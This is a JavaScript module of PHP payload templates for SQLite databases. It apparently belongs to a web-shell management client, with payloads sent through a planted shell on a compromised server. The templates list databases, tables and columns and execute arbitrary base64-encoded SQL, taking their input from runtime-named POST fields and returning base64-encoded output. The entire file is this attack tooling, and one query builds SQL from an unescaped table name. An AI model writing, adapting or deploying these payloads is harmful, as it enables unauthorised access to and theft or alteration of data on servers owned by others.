/**
 * 数据库管理模板:: sqlite3 pdo
 * i 数据分隔符号 => \\t|\\t
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $cs='sqlite:'.$hst;
      $dbh=new PDO($cs,'','');
      if(!$dbh){
        echo("ERROR://CONNECT ERROR");
      }else{
        echo("main".chr(9));
        $dbh=null;
      }`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}'
  },
  // 显示数据库所有表
  show_tables: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $cs='sqlite:'.$hst;
      $dbh=new PDO($cs,'','');
      if(!$dbh){
        echo("ERROR://CONNECT ERROR");
      }else{
        $query="select tbl_name from sqlite_master where type='table' order by tbl_name;";
        $result=$dbh->prepare($query);
        $result->execute();
        while($res=$result->fetch(PDO::FETCH_ASSOC)){
          echo(trim($res['tbl_name']).chr(9));
        }
        $dbh=null;
      }`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}'
  },
  // 显示表字段
  show_columns: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
      $cs='sqlite:'.$hst;
      $dbh=new PDO($cs,'','');
      if(!$dbh){
        echo("ERROR://CONNECT ERROR");
      }else{
        $query="pragma table_info('{$tab}');";
        $result=$dbh->prepare($query);
        $result->execute();
        while($res=$result->fetch(PDO::FETCH_ASSOC)){
          echo(trim($res['name'])." ({$res['type']})".chr(9));
        }
        $dbh = null;
      }`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{table}'
  },
  // 执行SQL语句
  query: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $sql=base64_decode($_POST["${arg5}"]);
      $encode=$m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"];
      $cs='sqlite:'.$hst;
      $dbh=new PDO($cs,'','');
      if(!$dbh){
        echo("ERROR://CONNECT ERROR");
      }else{
        $result=$dbh->prepare($sql);
        if(!$result->execute()){
          echo("Status\\t|\\t\\r\\n");
          $err="";
          foreach(@$result->errorInfo() as $v){
            $err.=$v." ";
          }
          echo(base64_encode("ERROR://".$err)."\\t|\\t\\r\\n");
        }else{
          $bool=True;
          while($res=$result->fetch(PDO::FETCH_ASSOC)){
            if($bool){
              foreach($res as $key=>$value){
                echo($key."\\t|\\t");
              }
              echo "\\r\\n";
              $bool=False;
            }
            foreach($res as $key=>$value){
              echo(base64_encode($value!==NULL?$value:"NULL")."\\t|\\t");
            }
            echo "\\r\\n";
          }
          if($bool){
            if(!$result->columnCount()){
              echo("Affect Rows\\t|\\t\\r\\n".base64_encode($result->rowCount())."\\t|\\t\\r\\n");
            }else{
              echo("Status\\t|\\t\\r\\n");
              echo(base64_encode("ERROR://Table is empty.")."\\t|\\t\\r\\n");
            }
          }
        }
        $dbh = null;
      }`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{base64::sql}',
    [arg6]: '#{encode}'
  }
})